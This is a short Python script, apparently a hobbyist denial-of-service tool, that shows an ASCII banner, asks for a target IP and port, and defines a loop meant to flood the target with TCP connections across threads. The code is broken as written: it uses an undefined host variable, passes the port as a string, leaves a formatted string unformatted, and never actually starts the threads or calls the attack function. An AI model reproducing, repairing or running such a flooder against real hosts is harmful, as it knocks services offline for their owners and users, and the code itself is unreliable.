#Author: IKingCpp
#Source:
import time
import os
import socket
import threading

os.system("clear")

r = "\033[91m" #red
y = "\033[33m" #yellow
w = "\033[37m" #white

banner = """
{} MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
{} M       YMM M       YMM MMP     YMM MP       MM
{} M  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M
{} M  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM
{} M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M
{} M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M
{} M        MM M        MM MMb     dMM Mb       dM
{} MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM

{} Author:    {} IKingCpp
{} Source:    {} Soon

{} ------------
{} INPUT TARGET
{} ------------
""".format(r,r,r,r,r,r,r,r,y,w,y,w,w,w,w)

print(banner)

ip = input("[+]\033[01;31mIP TARGET :\033[01;37m ")
port = input("[+]\033[01;31mPORT : \033[01;37m ")
target_ip = socket.gethostbyname(ip)
##################################################
UDP_PORT = port
time.sleep(1)
print("[+]\033[01;31mTarget IP :\033[01;37m", target_ip)
time.sleep(1)
print("[+]\033[01;31mTarget Port :\033[01;37m", UDP_PORT)
time.sleep(3)
def run(k):
        while True:
             s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
             s.connect((host,port))
             print("Packet send To {target_ip}")
        for i in range(10):
           c = threading.Thread(target=run, args=[i])
           c.start()
